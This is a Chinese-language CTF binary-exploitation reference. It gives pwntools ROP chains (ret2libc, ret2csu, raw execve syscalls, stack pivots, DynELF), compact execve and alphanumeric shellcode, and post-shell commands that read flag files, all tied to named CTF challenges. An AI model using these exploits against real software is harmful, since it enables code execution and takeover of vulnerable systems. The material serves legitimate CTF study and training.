# CTF Pwn - ROP Chains and Shellcode

## 目录
- [ROP Chain Building](#rop-chain-building)
  - [两阶段 ret2libc（泄露 + Shell）](#two-stage-ret2libc-leak--shell)
  - [原始 Syscall ROP（当 system() 失败时）](#raw-syscall-rop-when-system-fails)
  - [ROP 链中的 rdx 控制](#rdx-control-in-rop-chains)
  - [execve 后的 Shell 交互](#shell-interaction-after-execve)
- [ret2csu — __libc_csu_init Gadgets（Crypto-Cat）](#ret2csu--__libc_csu_init-gadgets-crypto-cat)
- [通过 XOR 编码绕过 Bad Character 的 ROP（Crypto-Cat）](#bad-character-bypass-via-xor-encoding-in-rop-crypto-cat)
- [奇异的 x86 Gadgets — BEXTR/XLAT/STOSB/PEXT（Crypto-Cat）](#exotic-x86-gadgets--bextrxlatstosbpext-crypto-cat)
  - [64 位：BEXTR + XLAT + STOSB](#64-bit-bextr--xlat--stosb)
  - [32 位：PEXT（并行位提取）](#32-bit-pext-parallel-bits-extract)
- [通过 xchg rax,esp 实现 Stack Pivot（Crypto-Cat）](#stack-pivot-via-xchg-raxesp-crypto-cat)
- [sprintf() Gadget 链接绕过 Bad Character（PlaidCTF 2013）](#sprintf-gadget-chaining-for-bad-character-bypass-plaidctf-2013)
- [DynELF 自动化 Libc 发现（RC3 CTF 2016）](#dynelf-automated-libc-discovery-rc3-ctf-2016)
- [小缓冲区中的受限 Shellcode（TUM CTF 2016）](#constrained-shellcode-in-small-buffers-tum-ctf-2016)
- [Stack Canary XOR 尾声作为 RDX 清零 Gadget（VolgaCTF 2017）](#stack-canary-xor-epilogue-as-rdx-zeroing-gadget-volgactf-2017)
- [预初始化寄存器的最小 Shellcode（Square CTF 2017）](#minimal-shellcode-with-pre-initialized-registers-square-ctf-2017)
- [通过 syscall RIP 到 RCX 的唯一字节 Shellcode（HITCON 2017）](#unique-byte-shellcode-via-syscall-rip-to-rcx-hitcon-2017)
- [stub_execveat Syscall 作为 execve 替代（ASIS CTF 2018）](#stub_execveat-syscall-as-execve-alternative-asis-ctf-2018)
- [当 rax=0 时通过 push/pop 启动字母数字 Shellcode（nullcon HackIM 2019）](#alphanumeric-shellcode-bootstrap-via-pushpop-when-rax0-nullcon-hackim-2019)

关于双重栈枢轴、带 UTF-8 限制的 SROP、RETF 架构切换、seccomp 绕过、.fini_array 劫持、ret2vdso、pwntools 模板以及带输入反转的 shellcode，请参见 [rop-advanced.md](rop-advanced.md)。

---

## ROP Chain Building

```python
from pwn import *

elf = ELF('./binary')
libc = ELF('./libc.so.6')
rop = ROP(elf)

# 常用 gadgets
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

# 泄露 libc
payload = flat(
    b'A' * offset,
    pop_rdi,
    elf.got['puts'],
    elf.plt['puts'],
    elf.symbols['main']
)
```

### 两阶段 ret2libc（泄露 + Shell）

当分两阶段利用时，需谨慎选择第二阶段的返回目标：

```python
# 阶段 1：通过 puts@PLT 泄露 libc，然后重新进入 vuln 进行阶段 2
payload1 = b'A' * offset
payload1 += p64(pop_rdi)
payload1 += p64(elf.got['puts'])
payload1 += p64(elf.plt['puts'])
payload1 += p64(CALL_VULN_ADDR)   # main 中 'call vuln' 指令的地址

# 重要：泄露后的返回目标
# - 返回 main 可能因 check_status/setup 栈破坏而崩溃
# - 直接返回 vuln 可能有栈问题
# - 最佳：返回 main 中的 'call vuln' 指令（例如 0x401239）
#   这样通过 CALL 指令设置了干净的栈帧
```

**无换行 printf 的泄露解析：**
```python
# 如果 printf("Laundry complete") 没有尾随换行符，
# puts() 泄露会紧跟其后出现在同一行：
# 输出示例："Laundry complete\x50\x5e\x2c\x7e\x56\x7f\n"
p.recvuntil(b'Laundry complete')
leaked = p.recvline().strip()
libc_addr = u64(leaked.ljust(8, b'\x00'))
```
### 原始 Syscall ROP（当 system() 失败时）

如果通过 libc 函数入口调用 `system()` 或 `execve()` 崩溃（CET/IBT，栈问题），可以使用 libc gadgets 中的原始 `syscall` 指令：

```python
# 在 libc 中查找 gadgets
libc_rop = ROP(libc)
pop_rax = libc_rop.find_gadget(['pop rax', 'ret'])[0]
pop_rdi = libc_rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = libc_rop.find_gadget(['pop rsi', 'ret'])[0]
pop_rdx_rbx = libc_rop.find_gadget(['pop rdx', 'pop rbx', 'ret'])[0]  # 现代 glibc 中常见
syscall_ret = libc_rop.find_gadget(['syscall', 'ret'])[0]

# execve("/bin/sh", NULL, NULL) = syscall 59
payload = b'A' * offset
payload += p64(libc_base + pop_rax)
payload += p64(59)
payload += p64(libc_base + pop_rdi)
payload += p64(libc_base + next(libc.search(b'/bin/sh')))
payload += p64(libc_base + pop_rsi)
payload += p64(0)
payload += p64(libc_base + pop_rdx_rbx)
payload += p64(0)
payload += p64(0)  # rbx 垃圾值
payload += p64(libc_base + syscall_ret)
```

**何时使用原始 syscall 与 libc 函数：**
- 通过 libc 的 `system()`：最简单，但可能因栈对齐或 CET 崩溃
- 通过 libc 的 `execve()`：避免 `system()` 的子进程开销，但有相同的 CET 风险
- 原始 `syscall`：绕过所有 libc 函数的函数前序，ROP 最可靠
- 注意：现代 libc 中 `pop rdx; ret` 很少见，通常寻找 `pop rdx; pop rbx; ret`

### ROP 链中 rdx 控制

调用 libc 函数（尤其是 `puts`）后，`rdx` 通常会被破坏成一个小值（例如 1），这会破坏后续 ROP 链中 `read(fd, buf, rdx)` 的调用。

**解决方案：**
1. **从 libc 中找到 pop rdx gadget** —— `pop rdx; ret` 很少见；寻找 `pop rdx; pop rbx; ret`（glibc 2.35 中常见于约 0x904a9）
2. **重新进入二进制的 read 设置代码** —— 跳转到设置 `rdx` 的代码段：
   ```python
   # 漏洞的 read 设置：lea rax,[rbp-0x40]; mov edx,0x100; mov rsi,rax; mov edi,0; call read
   # 先设置 rbp，使 rbp-0x40 指向目标缓冲区：
   POP_RBP_RET = 0x40113d
   VULN_READ_SETUP = 0x4011ea  # lea rax, [rbp-0x40]

   payload += p64(POP_RBP_RET)
   payload += p64(TARGET_ADDR + 0x40)  # rbp-0x40 = TARGET_ADDR
   payload += p64(VULN_READ_SETUP)     # read(0, TARGET_ADDR, 0x100)
   # 警告：read 后代码继续执行 printf + leave;ret
   # leave 会设置 rsp=rbp，因此栈会pivot到 rbp！
   ```
3. **通过 leave;ret 进行栈 pivot** —— 重新进入漏洞的 read 代码时，read 后的 `leave;ret` 会将栈指针切换到 `rbp`。你可以将下一个 ROP 链写在通过 read 传入数据的 `rbp+8` 处。

### execve 后的 Shell 交互

通过 ROP 生成 shell 后，shell 会从与二进制相同的 stdin 读取。过早发送的命令可能会被之前的 `read()` 调用消耗掉。

```python
p.send(payload)  # 触发 execve

# 等待 shell 初始化后再发送命令
import time
time.sleep(1)
p.sendline(b'id')
time.sleep(0.5)
result = p.recv(timeout=3)

# 获取 flag：
p.sendline(b'cat /flag* flag* 2>/dev/null')
time.sleep(0.5)
flag = p.recv(timeout=3)

# 使用 pwntools 时不要通过 stdin 管道发送命令 —— 它们会被之前的 read() 调用消耗。
# 应该在延时后使用显式的 sendline()。
```

## ret2csu — __libc_csu_init Gadgets（Crypto-Cat）

**何时使用：** 需要控制 `rdx`、`rsi` 和 `edi` 进行函数调用，但二进制中没有直接的 `pop rdx` gadget。`__libc_csu_init` 几乎存在于所有动态链接的 ELF 二进制中，包含两个有用的 gadget 序列。

**Gadget 1（pop 链）：** 在 `__libc_csu_init` 末尾：
```asm
pop rbx        ; 0
pop rbp        ; 1
pop r12        ; 函数指针（GOT 表项地址）
pop r13        ; edi 值
pop r14        ; rsi 值
pop r15        ; rdx 值
ret
```

**Gadget 2（调用 + 设置寄存器）：** 在 `__libc_csu_init` 较早处：
```asm
mov rdx, r15   ; rdx = r15
mov rsi, r14   ; rsi = r14
mov edi, r13d  ; edi = r13（32 位！）
call [r12 + rbx*8]  ; 调用函数指针
add rbx, 1
cmp rbp, rbx
jne .loop      ; 如果 rbx != rbp 则循环
; 跳转回 gadget 1 的 pop 链
```

**利用模式：**
```python
csu_pop = elf.symbols['__libc_csu_init'] + OFFSET_TO_POP_CHAIN
csu_call = elf.symbols['__libc_csu_init'] + OFFSET_TO_MOV_CALL

payload = flat(
    b'A' * offset,
    csu_pop,
    0,            # rbx = 0（索引）
    1,            # rbp = 1（循环次数，必须等于 rbx+1）
    elf.got['puts'],  # r12 = 要调用的函数（GOT 表项）
    0xdeadbeef,   # r13 → edi（第一个参数，仅 32 位！）
    0xcafebabe,   # r14 → rsi（第二个参数）
    0x12345678,   # r15 → rdx（第三个参数）
    csu_call,     # 触发 mov + call
    b'\x00' * 56, # call 返回后 7 次 pop 的填充
    next_gadget,  # csu 完成后的返回地址
)
```

**限制：** `edi` 是通过 `mov edi, r13d` 设置的 —— 只写入低 32 位。对于 64 位的第一个参数，应该使用 `pop rdi; ret` gadget。函数是通过 `call [r12 + rbx*8]` 间接调用的，因此 `r12` 必须指向 GOT 表项或包含目标地址的内存。

**关键点：** ret2csu 提供了通用 gadget，用于设置最多 3 个参数（`rdi`、`rsi`、`rdx`）并通过 GOT 表项调用任意函数，无需 libc gadgets。当二进制体积小但动态链接时非常有用。

---
## 通过 XOR 编码绕过 ROP 中的坏字符（Crypto-Cat）

**使用时机：** ROP payload 需要将数据（例如 `"/bin/sh"` 或 `"flag.txt"`）写入内存，但某些字节被禁止（如空字节、换行符、空格等）。

**策略：** 使用已知密钥对每块数据进行 XOR 编码，将 XOR 后的值写入 `.data` 段，然后利用二进制中的 gadget 在原地再 XOR 一次恢复。

**所需 gadget：**
```asm
pop r14; pop r15; ret          ; 加载 XOR 密钥 (r14) 和目标地址 (r15)
xor [r15], r14; ret            ; 将 r15 指向的内存与 r14 进行 XOR
mov [r15], r14; ret            ; 将 r14 写入 r15 指向的内存（初始写入）
```

**利用模式：**
```python
data_section = elf.symbols['__data_start']  # 或 .data 段地址
xor_key = 2  # 简单密钥，能去除坏字符

def xor_bytes(data, key):
    return bytes(b ^ key for b in data)

target = b"flag.txt"
encoded = xor_bytes(target, xor_key)

payload = b'A' * offset

# 以 8 字节为单位写入 XOR 后的数据
for i in range(0, len(encoded), 8):
    chunk = encoded[i:i+8].ljust(8, b'\x00')
    payload += flat(
        pop_r14_r15,
        chunk,                    # XOR 后的数据
        data_section + i,         # 目标地址
        mov_r15_r14,              # 写入内存
    )

# 对每块数据再 XOR 一次以恢复原文
for i in range(0, len(target), 8):
    payload += flat(
        pop_r14_r15,
        p64(xor_key),             # XOR 密钥
        data_section + i,         # 目标地址
        xor_r15_r14,              # 原地解码
    )

# 现在 data_section 中包含 "flag.txt" — 用作参数
payload += flat(pop_rdi, data_section, elf.plt['print_file'])
```

**关键点：** XOR 是自逆的（`a ^ k ^ k = a`）。选择一个能将所有禁止字节转换为允许字节的密钥。简单情况下，XOR `2` 或 `0x41` 即可。复杂限制时，可逐字节求解：对每个位置，找到任意一个密钥字节，使得 `original ^ key` 不包含坏字符。

---

## 奇异的 x86 Gadgets — BEXTR/XLAT/STOSB/PEXT（Crypto-Cat）

**使用时机：** 二进制中没有标准的 `mov [reg], reg` 写入 gadget。寻找可串联用于逐字节写内存的冷门 x86 指令。

### 64 位：BEXTR + XLAT + STOSB

**BEXTR**（位域提取）从源寄存器中提取位。**XLAT** 通过表查找转换字节（`al = [rbx + al]`）。**STOSB** 将 `al` 存储到 `[rdi]` 并递增 `rdi`。

```python
# 来自二进制 questionableGadgets 区段的 gadgets
xlat_ret = elf.symbols.questionableGadgets          # xlat byte ptr [rbx]; ret
bextr_ret = elf.symbols.questionableGadgets + 2     # pop rdx; pop rcx; add rcx, 0x3ef2;
                                                     # bextr rbx, rcx, rdx; ret
stosb_ret = elf.symbols.questionableGadgets + 17    # stosb byte ptr [rdi], al; ret

data_section = elf.symbols.__data_start

# 逐字节写入 "flag.txt"
for i, char in enumerate(b"flag.txt"):
    # 找到二进制只读数据中该字符的地址
    char_addr = next(elf.search(bytes([char])))

    # BEXTR 使用 rdx 作为控制，从 rcx 中提取 rbx
    # rcx = char_addr - 0x3ef2（补偿 add 指令）
    # rdx = 0x4000（提取从第 0 位开始的 64 位）
    payload += flat(
        bextr_ret,
        0x4000,                    # rdx（BEXTR 控制：start=0，len=64）
        char_addr - 0x3ef2,        # rcx（偏移补偿）
        xlat_ret,                  # al = [rbx + al]
        pop_rdi,
        data_section + i,
        stosb_ret,                 # [rdi] = al; rdi++
    )
```
### 32位：PEXT（并行位提取）

**PEXT** 使用掩码从源中选择位并将它们连续打包。结合 BSWAP 和 XCHG 实现字节级写入。

```python
# Gadgets
pext_ret = elf.symbols.questionableGadgets           # mov eax,ebp; mov ebx,0xb0bababa;
                                                      # pext edx,ebx,eax; ...ret
bswap_ret = elf.symbols.questionableGadgets + 21     # pop ecx; bswap ecx; ret
xchg_ret = elf.symbols.questionableGadgets + 18      # xchg byte ptr [ecx], dl; ret

# 对每个目标字节，计算掩码使得 PEXT(0xb0bababa, mask) = target_byte
def find_mask(target_byte, source=0xb0bababa):
    """寻找32位掩码，通过PEXT从source中提取target_byte。"""
    source_bits = [(source >> i) & 1 for i in range(32)]
    target_bits = [(target_byte >> i) & 1 for i in range(8)]
    # 从source中选择8个位匹配target位
    mask = 0
    matched = 0
    for i in range(32):
        if matched < 8 and source_bits[i] == target_bits[matched]:
            mask |= (1 << i)
            matched += 1
    return mask if matched == 8 else None
```

**关键洞察：** 当二进制缺少标准写入gadget时，可以链式使用一些特殊指令（BEXTR、PEXT、XLAT、STOSB、BSWAP、XCHG）达到同样效果。检查挑战二进制中的 `questionableGadgets` 或类似标记的部分。

---

## 通过 xchg rax,esp 实现栈枢轴（Crypto-Cat）

**使用时机：** 缓冲区太小无法放下完整ROP链，但程序泄露了堆/栈地址，且该地址处已准备好更大的缓冲区。

**两阶段模式：**
```python
# 阶段1：程序提供写入用户数据的堆地址
pivot_addr = int(io.recvline(), 16)

# 在枢轴地址准备ROP链（通过之前的输入）
stage2_rop = flat(
    pop_rdi, elf.got['puts'],
    elf.plt['puts'],             # 泄露 libc 地址
    elf.symbols['main'],         # 返回 main 进行阶段3
)
io.send(stage2_rop)             # 由程序写入 pivot_addr

# 阶段2：溢出并进行栈枢轴
xchg_rax_esp = elf.symbols.usefulGadgets + 2  # xchg rax, esp; ret
pop_rax = elf.symbols.usefulGadgets            # pop rax; ret

payload = flat(
    b'A' * offset,
    pop_rax,
    pivot_addr,         # 将枢轴地址加载到 rax
    xchg_rax_esp,       # 交换 rax ↔ esp → 栈指针指向 stage2_rop
)
```

**为何用 xchg 而非 leave; ret：**
- `leave; ret` 设置 `rsp = rbp` — 需要控制 `rbp`（通常可通过溢出）
- `xchg rax, esp` 直接交换 — 需要控制 `rax`（通过 `pop rax; ret`）
- `xchg` 即使 `rbp` 不在栈上（如小缓冲区溢出）也能工作

**限制：** `xchg rax, esp` 在 x86-64 上会截断为32位（将 rsp 高32位置零）。枢轴地址必须在低4GB地址空间内。堆和 mmap 区域通常符合，栈地址（0x7fff...）则不符合。

---

## 利用 sprintf() Gadget 链绕过坏字符（PlaidCTF 2013）

**模式：** 当 shellcode 含有输入处理器过滤的字节（如 null、空格、斜杠、冒号等）时，使用 `sprintf()` 从可执行文件自身内存中逐字节复制——一次一个字节——在 BSS 区组装干净的 shellcode。

```python
from pwn import *

# 第1步：扫描可执行文件，找到包含每个所需字节的地址
exe_data = open('binary', 'rb').read()
byte_addrs = {}  # 映射字节值 -> 可执行文件中的地址
for c in range(256):
    for i in range(len(exe_data)):
        addr = exe_base + i
        if exe_data[i] == c and not has_bad_chars(p32(addr)):
            byte_addrs[c] = addr
            break

# 第2步：为每个 shellcode 字节链式调用 sprintf(bss_dest, byte_addr)
rop = b''
for i, byte in enumerate(shellcode):
    rop += p32(sprintf_plt)
    rop += p32(pop3ret)           # 清理3个参数
    rop += p32(bss_addr + i)     # 目标地址
    rop += p32(byte_addrs[byte]) # 源地址（1字节 + null 终止）
    rop += p32(0)                # 未使用参数

# 第3步：跳转到 BSS 上组装好的 shellcode
rop += p32(bss_addr)
```

**关键洞察：** `sprintf(dst, src)` 会复制直到遇到 null 终止符——当 `src` 指向一个字节后跟 `\x00` 时，等效于单字节复制。ROP链中的每次调用放置一个 shellcode 字节。源地址来自二进制自身的 `.text`/`.rodata` 段。需要 `pop3ret` gadget 来清理调用间的栈。

---
## DynELF 自动化 Libc 发现（RC3 CTF 2016）

当远程 libc 版本未知时，使用 pwntools 的 `DynELF` 通过格式化字符串或读取原语泄露内存，在运行时解析函数地址。

```python
from pwn import *

elf = ELF('./target')
io = remote('target.ctf', 1337)

# 定义一个泄露函数，读取给定地址的内存
def leak(addr):
    payload = b'A' * offset
    payload += p64(elf.plt['printf'])  # 调用 printf 泄露
    payload += p64(main_addr)          # 返回 main 以便下一次泄露
    payload += p64(addr)               # 参数：要读取的地址
    io.sendline(payload)
    data = io.recvuntil(b'prompt', drop=True)
    return data

# DynELF 通过解析内存中的 ELF 结构来解析符号
d = DynELF(leak, elf=elf)
system_addr = d.lookup('system', 'libc')
binsh_addr = d.lookup(None, 'libc')  # 搜索 "/bin/sh" 字符串

log.success(f"system @ {hex(system_addr)}")

# 使用解析出的地址构建最终 ROP 链
payload = b'A' * offset
payload += p64(pop_rdi_ret)
payload += p64(binsh_addr)
payload += p64(system_addr)
io.sendline(payload)
io.interactive()
```

**关键点：** DynELF 解析远程 ELF 的 `.dynamic` 段、链接映射和符号表，无需知道 libc 版本即可解析任意 libc 函数。需要一个可靠的内存读取原语（leak 函数）能读取任意地址。

---

## 小缓冲区内受限 Shellcode（TUM CTF 2016）

当 shellcode 空间极度受限（例如因 AES 块大小限制为 15-16 字节）时，使用最小寄存器设置并避免不必要的指令。

```asm
; 15 字节 execve("/bin/sh") x86-64 shellcode
; 假设：rsp 指向可写区域，"/bin/sh\0" 紧跟 shellcode 在栈上
; 使用 fasm 语法：

lea rdi, [rsp + 0x19]    ; 4 字节 - 指向栈上的 "/bin/sh"
cdq                       ; 1 字节  - rdx = 0 (envp = NULL)
push rdx                  ; 1 字节  - argv 的 NULL 终止符
push rdi                  ; 1 字节  - argv[0] = "/bin/sh"
push rsp                  ; 1 字节
pop rsi                   ; 1 字节  - rsi = argv = {"/bin/sh", NULL}
push 0x3b                 ; 2 字节 - execve 的系统调用号
pop rax                   ; 1 字节  - rax = 59
syscall                   ; 2 字节 - execve("/bin/sh", argv, NULL)
; 总计：15 字节

; 当涉及 AES-CBC 时，构造 IV 以 XOR 解密 shellcode 块：
; crafted_iv = AES_decrypt(known_ciphertext) XOR shellcode
```

**关键点：** `cdq` 指令（1 字节）将 eax 零扩展到 edx，`push reg; pop reg` 配对（2 字节）替代 `mov`（3 字节）。对于受 AES 块限制的 shellcode，通过 XOR `AES_decrypt(ciphertext_block)` 与目标 shellcode 计算出解密所需的 IV。

---

## 栈 Canary XOR 尾声作为 RDX 清零 Gadget（VolgaCTF 2017）

**使用场景：** 需要 `rdx = 0` 以调用 `execve(path, argv, NULL)`，但二进制中没有 `pop rdx; ret` gadget。canary 校验尾声 `xor rdx, fs:28h` 在 canary 完整时会将 RDX 清零。

```python
from pwn import *

# Canary 校验尾声（大多数二进制中存在）：
# mov rdx, [rsp+8]    ; 从栈加载 canary
# xor rdx, fs:28h     ; 与存储的 canary 异或 → 完整时为 0
# 跳转到此代码作为 gadget 来清零 RDX

# 在二进制中查找 canary 校验序列
canary_xor_gadget = next(binary.search(asm(
    "mov rdx, [rsp+8]; xor rdx, qword ptr fs:[0x28]"
)))
# 副作用：无害的 je 结果写入，rdx = 0 用于 execve(path, argv, NULL)

# 在 ROP 链中使用：
rop = flat(
    pop_rdi, binsh_addr,          # rdi = "/bin/sh"
    pop_rsi, 0,                   # rsi = NULL (argv)
    canary_xor_gadget,            # rdx = canary ^ fs:28h = 0
    execve_addr,                  # execve("/bin/sh", NULL, NULL)
)
```

**关键点：** 栈 canary 校验 `xor rdx, fs:28h` 在 canary 正确时产生 `rdx=0`。当缺少 `pop rdx` gadget 时，跳转到此尾声作为 gadget，提供可靠的清零 rdx 原语，副作用仅为无害的字节写入。因为栈上的 canary 与 `fs:28h` 匹配，XOR 结果在未被破坏的栈帧中总为零。

**识别时机：** ROP 链需要 `rdx=0`（execve 第三个参数常见），但二进制缺少 `pop rdx; ret` 或 `pop rdx; pop rbx; ret`。在二进制反汇编中搜索 `xor rdx, qword ptr fs:`，此指令出现在所有带栈 canary 的函数中。

**参考：** VolgaCTF 2017

---
## 预初始化寄存器的最小 Shellcode（Square CTF 2017）

**模式：** 当 shellcode 入口点的寄存器已经被初始化为有用的值（例如，x86-32 上 `write` 系统调用的 `eax=4`，`ebx=1` 表示 stdout），利用它们可以大幅减少 shellcode 大小。编写 shellcode 前务必审计入口时的寄存器状态。

**示例（x86-32 write 系统调用，入口：eax=4，ebx=1）：**
```asm
; 入口状态：eax=4（sys_write），ebx=1（stdout 文件描述符）
; 目标：将 flag 缓冲区写入 stdout — 只需设置 ecx 和 edx

; 3 字节：将 ecx 指向 flag 缓冲区
lea ecx, [edi + flag_offset]   ; 3 字节（如果偏移量能用 1 字节表示）

; 2 字节：设置 edx（字节数）
mov dl, 64                      ; 2 字节

; 2 字节：触发系统调用
int 0x80                        ; 2 字节

; 总计：7 字节 — 如果 edx 已经设置，则最少 5 字节
```

**工作流程：**
```python
# 1. 在 gdb 中运行二进制，断点设置在 shellcode 执行前
# 2. 查看所有寄存器：info registers
# 3. 确认哪些系统调用参数已被设置
# 4. 只编写填充缺失参数所需的指令

# 有用的预初始化模式：
# - eax = 调用者已设置的系统调用号
# - ebx = 文件描述符（stdin=0，stdout=1）由之前的打开/设置操作提供
# - rdi, rsi 来自调用约定泄露
# - rsp 指向可写区域（用于基于 push 的寻址）
```

**关键洞察：** 编写 shellcode 前务必审计入口寄存器值 — 预加载的系统调用号和文件描述符能将 shellcode 缩减到 6 字节以下。最小的 shellcode 利用 ABI 调用约定中周围代码遗留的寄存器状态。

**参考：** Square CTF 2017

---

## 通过 syscall 将 RIP 传递到 RCX 的唯一字节 Shellcode（HITCON 2017）

**模式：** x86-64 的 `syscall` 指令会将下一条指令地址（RIP）保存到 `RCX` 寄存器作为副作用。一个 8 字节的启动器利用这一点：执行 `syscall`（同时触发预设寄存器的 `read`），然后使用 `rcx`（此时为 `syscall` 后下一条指令的地址）作为读取完整 shellcode 到同一 RWX 区域的地址。启动器的所有 8 字节必须唯一（无重复字节）。

**8 字节启动器构造：**
```asm
; 入口约束：rax=0（read），rdi=0（stdin），rsi=shellcode_buf，rdx=8（小尺寸）
; syscall 的副作用：rcx = RIP（syscall 后下一条指令地址）

syscall          ; 2 字节：0f 05 — 执行 read(0, shellcode_buf, 8)
                 ;           并设置 rcx = &next_instr (= shellcode_buf + 2)
push rcx         ; 1 字节：  51 — 栈顶 = [shellcode_buf + 2]
pop rsi          ; 1 字节：  5e — rsi = shellcode_buf + 2（完整 shellcode 的存放地址）
xor edx, edx     ; 2 字节：31 d2 — 清零 rdx
mov dl, 100      ; 2 字节：b2 64 — rdx = 100（第二阶段读取大小）
; 返回 syscall（循环）：push/pop 序列最终跳转回 syscall
; ... 或安排入口使下一次 syscall 读取 100 字节到 rsi
```

**唯一性约束：**
```python
# 所有 8 字节必须不同（挑战特定过滤）
# 候选序列：0f 05 51 5e 31 d2 b2 64 — 全部唯一
# 验证：len(set(bytes)) == len(bytes)
stager = bytes([0x0f, 0x05, 0x51, 0x5e, 0x31, 0xd2, 0xb2, 0x64])
assert len(set(stager)) == len(stager)  # 通过

# 第二阶段：启动器执行第一个 syscall 后，从 stdin 发送完整 execve shellcode
from pwn import *
p.send(stager)
p.send(asm(shellcraft.sh()))
```

**关键洞察：** x86-64 的 `syscall` 会将 RIP 复制到 RCX — 利用此特性实现位置无关地址发现，构造极小的 shellcode 启动器。启动器无需硬编码地址：它通过 `syscall` 副作用计算自身位置，再用该地址作为读取完整 payload 的目标。

**参考：** HITCON CTF 2017

---
## stub_execveat 系统调用作为 execve 替代方案（ASIS CTF 2018）

**模式：** 在只有 `read` 系统调用且没有 `pop rax` gadget 的极小二进制中，使用 `stub_execveat`（系统调用号 0x142/322）替代 `execve`（0x3b）。由于 `read()` 返回读取字节数于 `rax`，使总输入长度恰好为 0x142 字节，这样当系统调用 gadget 触发时 `rax=0x142`。

**为什么可行：**
1. 二进制极小——只有 `read` 和基本 gadget，没有 `pop rax; ret`
2. `execve` 需要 `rax=0x3b`（59），但没有 `pop rax` 无法设置
3. `read()` 返回读取字节数于 `rax`——这是唯一能控制 `rax` 的方式
4. `stub_execveat`（系统调用 322 = 0x142）在目录 fd 使用 `AT_FDCWD` 时接受与 `execve` 相同的参数
5. 发送恰好 0x142 字节，使 `read()` 返回 0x142，然后触发 `syscall`

```python
from pwn import *

# 二进制 gadget（极小静态二进制）
xor_rdx_syscall = 0x4000ed   # xor rdx, rdx; syscall
syscall_gadget  = 0x400101   # syscall

# 构造 payload：/bin/sh 字符串 + 填充 + ROP 链
# 总长度必须恰好为 0x142 字节
payload  = b"/bin/sh\x00"                          # rdi 指向这里
payload += b"B" * (0x148 - (8*4) - 8)              # 填充到 ROP 区域
payload += p64(xor_rdx_syscall)                     # xor rdx, rdx; syscall
payload += p64(syscall_gadget)                      # syscall（rax=0x142 来自 read）
payload += b"A" * (0x142 - len(payload) - 1)        # 填充到恰好 0x142 字节
# rax = 0x142 来自 read() 返回值 = stub_execveat 系统调用号

io = remote('target', 1337)
io.send(payload)
io.interactive()
```

**关键洞察：** `stub_execveat`（系统调用 322/0x142）在使用 `AT_FDCWD` 时接受与 execve 相同的参数，但其更高的系统调用号可以通过 `read()` 返回值达到，当没有 `pop rax; ret` gadget 时非常有用。务必检查是否存在功能等效的替代系统调用，其编号可通过返回值或其他隐式寄存器控制方式达到。

**参考：** ASIS CTF 2018

---

## rax=0 时通过 push/pop 实现字母数字 Shellcode 引导（nullcon HackIM 2019）

**模式（easy-shell）：** RWX 页接收攻击者 shellcode，但每个字节必须是字母数字（`[0-9A-Za-z]`）。工具如 [basic-amd64-alphanumeric-shellcode-encoder](https://github.com/veritas501/basic-amd64-alphanumeric-shellcode-encoder) 会生成自解码 stub，但要求入口时 `rax + padding_len == shellcode_address`。当执行环境进入时 `rax=0`（远离 shellcode 地址），编码器无处落脚。预先添加一个 3 字节的非字母数字但被接受的种子——`push r12; pop rax`——使 `rax` 成为有效的栈/代码指针，然后以 `padding_len=3` 调用编码器。

```python
from pwn import *
context(arch='amd64')

file_name = "flag".ljust(8, '\x00')
sc = '''
    mov rax, %s
    push rax
    mov rdi, rsp
    mov rax, 2          /* open(rsp, 0) */
    mov rsi, 0
    syscall
    mov rdi, rax
    sub rsp, 0x20
    mov rsi, rsp
    mov rdx, 0x20
    mov rax, 0          /* read(fd, rsp, 0x20) */
    syscall
    mov rdi, 0
    mov rsi, rsp
    mov rdx, 0x20
    mov rax, 1          /* write(1, rsp, 0x20) */
    syscall
''' % hex(u64(file_name))
sc = asm(sc)

# push r12 (0x41 0x54) + pop rax (0x58) = 3 字节，均为字母数字安全字符
bootstrap = asm("push r12; pop rax;")
payload = bootstrap + alphanum_encoder(sc, 3)
```

**关键洞察：** 仅字母数字解码器通常需要 `rax` 指向（或在其前固定偏移处）payload。如果执行环境将 `rax` 清零，则从 *任何* 已持有有效地址的易失寄存器中种子初始化——`r12` 在 Linux 下通常是 `_start`，而 `push r12; pop rax` 恰好是 `AT X`（0x41 0x54 0x58），编码器的输入过滤器视为安全。调整编码器的 `padding_len` 参数以精确匹配预置字节数，确保解码数学计算正确。

**参考：** nullcon HackIM 2019 — easy-shell，writeups 13048, 13203
